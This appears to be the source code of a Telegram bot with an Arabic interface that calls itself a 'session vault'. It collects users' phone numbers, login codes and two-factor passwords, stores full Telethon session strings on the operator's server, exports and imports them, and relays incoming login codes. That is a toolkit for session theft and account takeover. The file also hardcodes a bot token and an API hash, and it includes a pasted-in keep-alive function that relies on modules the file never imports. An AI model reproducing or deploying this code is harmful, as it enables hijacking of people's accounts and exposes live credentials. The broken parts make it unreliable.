import os
import json
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# --- الإعدادات المباشرة ---
API_ID = 35980161
API_HASH = 'd879538c1b65ee6aa57ac3b4ce4b63d3'
BOT_TOKEN = '8615971361:AAHI51Wd-fj5xKcUwbqyJxbgA7CuuSjebIY'

DB_FILE = 'sessions.json'
active_clients = {}  # يخزن الحسابات النشطة: {user_id: {phone: client}}
radar_mode = {}      # يخزن حالة الرادار: {user_id: phone}
user_states = {}     # يخزن حالة المستخدم الحالية (انتظار رقم، كود، الخ)
app = None

# --- قاعدة البيانات ---
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f)

db = load_db()

# --- دالة إنشاء الأزرار الملونة مع حماية من الأخطاء ---
def btn(text, callback_data=None, url=None, style=None):
    kwargs = {"text": text}
    if callback_data: kwargs["callback_data"] = callback_data
    if url: kwargs["url"] = url
    if style:
        try:
            # كود التلوين (Bot API 9.0+)
            return InlineKeyboardButton(**kwargs, style=style)
        except TypeError:
            pass # إذا كانت النسخة قديمة، سيتجاهل اللون ويعمل عادي
    return InlineKeyboardButton(**kwargs)

# --- دوال Telethon (إدارة الحسابات) ---
async def start_telethon_client(user_id, phone, session_str=None):
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        return None
    
    # مستمع الرادار لكل حساب
    @client.on(events.NewMessage(from_users=777000))
    async def otp_handler(event):
        if radar_mode.get(user_id) == phone:
            code = event.raw_text
            try:
                await app.bot.send_message(
                    chat_id=user_id,
                    text=f"🔑 **وصل الرمز لحساب:** `{phone}`\n\n**الرمز:**\n`{code}`\n\nقم بنسخه فوراً.",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"Error sending to {user_id}: {e}")
            radar_mode.pop(user_id, None)
    
    return client

async def load_all_clients():
    for user_id_str, sessions in db.items():
        user_id = int(user_id_str)
        if user_id not in active_clients:
            active_clients[user_id] = {}
        for phone, session_str in sessions.items():
            client = await start_telethon_client(user_id, phone, session_str)
            if client:
                active_clients[user_id][phone] = client
                print(f"✅ Loaded client for {user_id} - {phone}")

# --- أوامر البوت (python-telegram-bot) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [btn("➕ إضافة حساب جديد", "add_account", style="success")],
        [btn("📱 حساباتي", "my_accounts", style="primary")],
        [btn("📤 تصدير الجلسات", "export_sessions", style="primary"), btn("📥 استيراد الجلسات", "import_sessions", style="success")]
    ]
    await update.message.reply_text("أهلاً بك يا سيدي في خزنة الجلسات.\nماذا تريد أن تفعل؟", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "add_account":
        user_states[user_id] = "waiting_phone"
        await query.edit_message_text("أرسل رقم هاتفك مع رمز الدولة (مثال: +213xxxxxxxx):")
    
    elif data == "my_accounts":
        user_clients = active_clients.get(user_id, {})
        phones = [p for p in user_clients.keys() if not p.startswith("temp_")]
        
        if not phones:
            await query.edit_message_text("ليس لديك أي حسابات مسجلة حالياً.")
            return
        
        keyboard = []
        for phone in phones:
            keyboard.append([btn(f"📱 {phone}", f"view_{phone}", style="primary")])
        keyboard.append([btn("🔙 رجوع", "main_menu", style="danger")])
        await query.edit_message_text("اختر حساباً لإدارته:", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data.startswith("view_"):
        phone = data.split("_", 1)[1]
        keyboard = [
            [btn("⏳ انتظار رمز الدخول (رادار)", f"radar_{phone}", style="danger")],
            [btn("🔙 رجوع", "my_accounts", style="primary")]
        ]
        await query.edit_message_text(f"الحساب: `{phone}`\n\nاضغط على الرادار لالتقاط أي رمز دخول يصل لهذا الحساب.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data.startswith("radar_"):
        phone = data.split("_", 1)[1]
        radar_mode[user_id] = phone
        await query.edit_message_text(f"✅ **الرادار يعمل الآن لحساب:** `{phone}`\n\nاذهب لهاتفك وأدخل رقمك، وبمجرد وصول الكود سأرسله لك هنا.", parse_mode="Markdown")
    
    elif data == "export_sessions":
        user_sessions = db.get(str(user_id), {})
        if not user_sessions:
            await query.edit_message_text("لا توجد جلسات لتصديرها.")
            return
        
        filename = f"sessions_{user_id}.json"
        with open(filename, 'w') as f:
            json.dump(user_sessions, f)
        
        await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption="💾 هذا ملف الجلسات الخاص بك. احتفظ به في مكان آمن لاستعادته لاحقاً.")
        os.remove(filename)
    
    elif data == "import_sessions":
        user_states[user_id] = "waiting_import"
        await query.edit_message_text("أرسل ملف الجلسات (JSON) الذي قمت بتصديره سابقاً.")
    
    elif data == "main_menu":
        user_states.pop(user_id, None)
        keyboard = [
            [btn("➕ إضافة حساب جديد", "add_account", style="success")],
            [btn("📱 حساباتي", "my_accounts", style="primary")],
            [btn("📤 تصدير الجلسات", "export_sessions", style="primary"), btn("📥 استيراد الجلسات", "import_sessions", style="success")]
        ]
        await query.edit_message_text("أهلاً بك يا سيدي في خزنة الجلسات.\nماذا تريد أن تفعل؟", reply_markup=InlineKeyboardMarkup(keyboard))

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_states.get(user_id)
    if not state: return

    text = update.message.text or ""

    if state == "waiting_phone":
        phone = text.strip()
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            await client.send_code_request(phone)
            user_states[user_id] = f"waiting_code:{phone}"
            if user_id not in active_clients: active_clients[user_id] = {}
            active_clients[user_id][f"temp_{phone}"] = client
            await update.message.reply_text(f"✅ تم إرسال الكود لهاتفك. أرسل الكود هنا الآن:")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            user_states.pop(user_id, None)

    elif state.startswith("waiting_code:"):
        phone = state.split(":", 1)[1]
        code = text.strip()
        client = active_clients.get(user_id, {}).get(f"temp_{phone}")
        if not client:
            await update.message.reply_text("❌ انتهت الجلسة المؤقتة، أعد المحاولة.")
            user_states.pop(user_id, None)
            return
        
        try:
            await client.sign_in(phone, code)
            session_str = StringSession.save(client.session)
            
            if str(user_id) not in db: db[str(user_id)] = {}
            db[str(user_id)][phone] = session_str
            save_db(db)
            
            active_clients[user_id].pop(f"temp_{phone}", None)
            active_clients[user_id][phone] = client
            
            await update.message.reply_text(f"🔥 تم تسجيل الدخول وحفظ الجلسة بنجاح!\nالحساب الآن محفوظ في خزنتك.")
            user_states.pop(user_id, None)
            
        except SessionPasswordNeededError:
            user_states[user_id] = f"waiting_password:{phone}"
            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور (2FA). أرسل كلمة المرور:")
        except Exception as e:
            await update.message.reply_text(f"❌ كود خاطئ أو خطأ: {e}")
            user_states.pop(user_id, None)

    elif state.startswith("waiting_password:"):
        phone = state.split(":", 1)[1]
        password = text.strip()
        client = active_clients.get(user_id, {}).get(f"temp_{phone}")
        
        try:
            await client.sign_in(password=password)
            session_str = StringSession.save(client.session)
            
            if str(user_id) not in db: db[str(user_id)] = {}
            db[str(user_id)][phone] = session_str
            save_db(db)
            
            active_clients[user_id].pop(f"temp_{phone}", None)
            active_clients[user_id][phone] = client
            
            await update.message.reply_text("🔥 تم تسجيل الدخول وحفظ الجلسة بنجاح (مع 2FA)!")
            user_states.pop(user_id, None)
        except Exception as e:
            await update.message.reply_text(f"❌ كلمة مرور خاطئة: {e}")
            user_states.pop(user_id, None)

    elif state == "waiting_import":
        if not update.message.document:
            await update.message.reply_text("❌ الرجاء إرسال ملف JSON صالح.")
            return
        
        file = await update.message.document.get_file()
        file_path = f"import_{user_id}.json"
        await file.download_to_drive(file_path)
        
        try:
            with open(file_path, 'r') as f:
                imported_sessions = json.load(f)
            
            if str(user_id) not in db: db[str(user_id)] = {}
            for phone, sess in imported_sessions.items():
                db[str(user_id)][phone] = sess
                if user_id not in active_clients: active_clients[user_id] = {}
                client = await start_telethon_client(user_id, phone, sess)
                if client:
                    active_clients[user_id][phone] = client
            
            save_db(db)
            os.remove(file_path)
            
            await update.message.reply_text(f"🔥 تم استيراد {len(imported_sessions)} جلسة بنجاح!")
            user_states.pop(user_id, None)
        except Exception as e:
            await update.message.reply_text(f"❌ ملف غير صالح أو حدث خطأ: {e}")
            if os.path.exists(file_path): os.remove(file_path)
def start_keepalive_server():
    if Flask is None:
        log.warning("flask غير مثبت — خادم keep-alive متوقف (pip install flask)")
        return
    web_app = Flask(__name__)
    logging.getLogger("werkzeug").setLevel(logging.WARNING)

    @web_app.route("/")
    def home(): return "Bot is Running!"

    def run_web():
        port = int(os.environ.get("PORT", 8080))
        web_app.run(host="0.0.0.0", port=port)

    threading.Thread(target=run_web, daemon=True).start()

# --- التشغيل الرئيسي ---
async def main():
    global app
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND, message_handler))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    print("جاري تحميل الجلسات المحفوظة...")
    await load_all_clients()
    print("النظام يعمل الآن بكامل طاقته!")
    
    # إبقاء السكربت يعمل
    await asyncio.Event().wait()

if __name__ == '__main__':
    asyncio.run(main())
